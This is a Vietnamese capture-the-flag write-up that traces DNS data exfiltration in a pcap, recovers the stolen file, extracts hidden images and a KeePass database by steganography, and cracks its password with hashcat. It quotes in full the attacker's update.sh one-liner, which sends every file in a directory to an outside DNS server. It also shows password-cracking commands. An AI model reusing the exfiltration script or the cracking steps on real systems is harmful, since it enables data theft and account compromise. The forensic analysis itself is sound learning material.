https://ctf.viblo.asia/puzzles/netlab2-protected-vault-hf0wmhwguj0

Bài này rất hay, tôi đã phải dùng nhiều các kĩ thuật khác nhau để tìm ra flag chứ không đơn thuần là chỉ từ file pcap là ra hết

Tôi sẽ chia làm 4 giai đoạn cho dễ hiểu

# Giai đoạn 1: Phân tích pcap
Từ file pcap mà bài cho, ta export được file `update.sh` 

```sh
for f in $(ls .); do s=4;b=50;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done ); do dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f|base58)|tr "+" "}"|tr "/" "{"` +short; done ; done
```

Cái script trên thực hiện exfiltrate dữ liệu qua DNS queries – một kỹ thuật phổ biến trong data exfiltration / DNS tunneling. Nói chung là `update.sh` sẽ:

- `for f in $(ls .); do` Lặp qua từng file trong thư mục hiện tại

- `s=4; b=50; c=0;` Thiết lập `s=4`: Số block DNS query trước khi xuống dòng; `b=50`:Độ dài chuỗi mỗi phần và `c=0`: Biến đếm

- `for r in $(for i in $(gzip -c $f | base64 -w0 | sed "s/.\{$b\}/&\n/g"); do` Nén file bằng gzip, sau đó mã hóa base64 không xuống dòng (-w0), rồi chia nhỏ chuỗi base64 thành các đoạn dài 50 ký tự

```sh
  if [[ "$c" -lt "$s" ]]; then
        echo -ne "$i-."
        c=$(($c+1))
      else
        echo -ne "\n$i-."
        c=1
      fi
    done
  );
```
- Gom 4 block (mỗi block dài 50 ký tự, ngăn cách bằng `-`) trên 1 dòng, sau đó xuống dòng (có thể để xử lý từng query DNS riêng)

- `dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f|base58) | tr "+" "}" | tr "/" "{"` +short;` Và cuối cùng với mỗi đoạn sẽ append thêm tên file đã được mã hóa base58 vào chuỗi dữ liệu; thay thế ký tự đặc biệt trong base64 (`+`,`/`) thành ký tự DNS-safe (`}`, `{`); sau đó dùng dig gửi DNS query tới server DNS cụ thể: `10.2.32.72`

## Kết quả: dữ liệu file được mã hóa + nén + chia nhỏ và gửi đi qua DNS query tới server đích — đây là DNS data exfiltration

Và trong wireshark ta cũng có thể thấy rõ rất nhiều các DNS query kì lạ gửi đến IP `10.2.32.72` đây cũng chính là IP của hacker

# Giai đoạn 2: Khôi phục file

Dùng tshark để lấy tất cả các data base64 `tshark -r netlab2.pcap -Y "dns && ip.dst == 10.2.32.72" -T fields -e dns.qry.name > susdnsquery.txt`

Tất nhiên sau khi có `susdnsquery.txt` vẫn chưa thể khôi phục lại file được vì hacker đã thực hiện nhiều sự thay đổi từ data base64 (đọc lại phần phân tích `update.sh` trong giai đoạn 1) lúc đầu nên ta phải khôi phục chúng về base64 ban đầu

Tôi đã tạo một script để làm những điều trên (bằng AI hehe), 2 phần quan trọng trong script là

```py
pattern = r'([A-Za-z0-9+/={}\[\]]+)-\.'
```

Dùng regex để tìm các chuỗi đứng trước `-.`

```py
processed = chunk.replace("{", "/").replace("}", "+")
```

Đổi các ký tự `{` và `}` thành `/` `+`

Chạy `recoverbase64.py` sẽ cho ta `base64Goc.txt`, sau đó có thể khôi phục lại file gzip

```sh
$ python recoverbase64.py
Starting extraction process...
Found 1857 matching chunks
Combined base64 length: 92696
Base64 data saved to 'base64Goc.txt'

# Thành công

$ base64 -d  base64Goc.txt > org.gz

$ gunzip org.gz

$ file org.gz
org.gz: gzip compressed data, was "blueteam.bmp", last modified: Fri Apr  8 06:35:19 2022, from Unix, original size modulo 2^32 339

# Chứa 1 file blueteam.bmp được nén

$ gunzip org.gz

$ file org
org: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 400x400, components 3
```

Giải nén cho ta file org (blueteam.bmp) là 1 file jpg, có thể chuyển về đúng định dạng để xem (blueteam.jpg), nhưng bức ảnh không quan trọng lắm

# Giai đoạn 3: Steganography

Gặp dạng này tôi thường đưa lên https://www.aperisolve.com/ (Web này sẽ chạy các tool steg phổ biến như zsteg, binwalk, stegsolve, steghide,...) có thể tự tải về máy để chạy

File `blueteam.jpg` khi được đưa vào binwalk hiện ra thêm 2 file ảnh ở trong nữa

```
$ binwalk blueteam.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
28358         0x6EC6          PNG image, 256 x 256, 8-bit colormap, non-interlaced
40712         0x9F08          JPEG image data, JFIF standard 1.01
```

Bình thường có thể dùng `binwalk -e` để đưa các phần này ra nhưng ở đây không được, vậy ta có thể dùng các lệnh khác như `dd` hoặc `foremost`

```
$ dd if=blueteam.jpg of=hidden.png bs=1 skip=28358 count=$((40712 - 28358))
12354+0 records in
12354+0 records out
12354 bytes (12 kB, 12 KiB) copied, 5.70105 s, 2.2 kB/s

$ dd if=blueteam.jpg of=hidden2.jpg bs=1 skip=40712
37892+0 records in
37892+0 records out
37892 bytes (38 kB, 37 KiB) copied, 16.2848 s, 2.3 kB/s
```

Lại có 2 file ảnh thì quy trình tương tự như làm với `blueteam.jpg`

Sau một lúc thì đã tìm được thêm một file qua `zsteg` trong ảnh `hidden.png`

```sh
$ zsteg lsb hidden.png
[.] lsb
[!] #<Errno::ENOENT: No such file or directory @ rb_sysopen - lsb>

[.] hidden.png
[?] 11010 bytes of extra data after image end (IEND), offset = 0x540
extradata:0         .. file: Keepass password database 2.x KDBX
    00000000: 03 d9 a2 9a 67 fb 4b b5  01 00 03 00 02 10 00 31  |....g.K........1|
    00000010: c1 f2 e6 bf 71 43 50 be  58 05 21 6a fc 5a ff 03  |....qCP.X.!j.Z..|
    00000020: 04 00 01 00 00 00 04 20  00 54 b6 74 14 2f 9a 18  |....... .T.t./..|
    00000030: aa ed 00 cf 79 a0 bf c3  2b a3 7b 84 3b 48 12 3f  |....y...+.{.;H.?|
    00000040: 45 3a 83 c2 c8 1c a4 4f  fe 05 20 00 24 df b9 b3  |E:.....O.. .$...|
    00000050: 6f 51 c4 96 db 79 24 87  fa 23 68 07 8a 41 f5 1f  |oQ...y$..#h..A..|
    00000060: 0b 84 ff e5 7e 42 7e 6e  fe 6d 98 7f 06 08 00 60  |....~B~n.m.....`|
    00000070: ea 00 00 00 00 00 00 07  10 00 b9 77 23 51 ef b5  |...........w#Q..|
    00000080: 50 cb 41 d4 d4 1c 0a e6  02 2c 08 20 00 7b 20 0a  |P.A......,. .{ .|
    00000090: 14 3b 10 b8 79 36 a4 a9  99 ea 86 35 24 f9 43 7b  |.;..y6.....5$.C{|
    000000a0: e2 66 0c 5a 29 3b d2 fa  b2 75 c0 53 7e 09 20 00  |.f.Z);...u.S~. .|
    000000b0: 09 04 ea 8a 12 80 8b 2a  8e 15 38 5b 68 91 f9 7e  |.......*..8[h..~|
    000000c0: 92 bf 35 24 1f 1e 21 59  8d ec 77 ef 1e ae 83 47  |..5$..!Y..w....G|
    000000d0: 0a 04 00 02 00 00 00 00  04 00 0d 0a 0d 0a 1c 22  |..............."|
    000000e0: d2 dc 12 19 64 a9 c2 f8  98 91 ee a0 67 39 c6 66  |....d.......g9.f|
    000000f0: 31 f0 83 b0 90 45 98 9e  a6 bd e8 5f 3f 8a ec 32  |1....E....._?..2|
imagedata           .. text: ["\t" repeated 9 times]
b3,rgb,msb,xy       .. file: OpenPGP Public Key
b4,rgb,msb,xy       .. text: "eUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVeUVe"
```

`lsb` để check phần least significant bit của ảnh ra một file `Keepass password database 2.x KDBX`

`dd if=hidden.png of=extracted.kdbx bs=1 skip=$((0x540))` Để lấy file

Để mở một file `.kdbx` có thể dùng phần mềm `KeePass Password Safe 2`

Ở đây bắt ta nhập mật khẩu nên sẽ phải crack

# Giai đoạn 4: Crack mật khẩu Keepass

Dùng `keepass2john extracted.kdbx > keepass_hash.txt` để lấy hash, nội dung file sẽ bắt đầu như `extracted:$keepass....`

Sau đó có thể dùng `john` hoặc `hashcat` với wordlist `rockyou.txt` để crack

Nếu dùng hashcat thì nên dùng mode `-m 13400` cho keepass 2 để tăng tốc độ, lúc này sẽ phải chỉnh lại `keepass_hash.txt` bằng cách xoá `extracted` 

Tham khảo trang web để biết format các loại hash https://hashcat.net/wiki/doku.php?id=example_hashes

```
$ hashcat -m 13400 keepass_hash.txt ../rockyou.txt

$keepass$*2*60000*0*54b674142f9a18aaed00cf79a0bfc32ba37b843b48123f453a83c2c81ca44ffe*24dfb9b36f51c496db792487fa2368078a41f51f0b84ffe57e427e6efe6d987f*b9772351efb550cb41d4d41c0ae6022c*0904ea8a12808b2a8e15385b6891f97e92bf35241f1e21598dec77ef1eae8347*1c22d2dc121964a9c2f89891eea06739c66631f083b09045989ea6bde85f3f8a:iloveyou
```

Vậy mật khẩu của file là `iloveyou`

Vào file đó, nhập mật khẩu và lấy flag thôi (Trong database sẽ có file title `Flag` có username `NetLab2`, flag chính là mật khẩu của user đó)

# Flag 

`Flag{NetLab2_DNS_3xf1ltr4t10n_15_5t3al7hy}`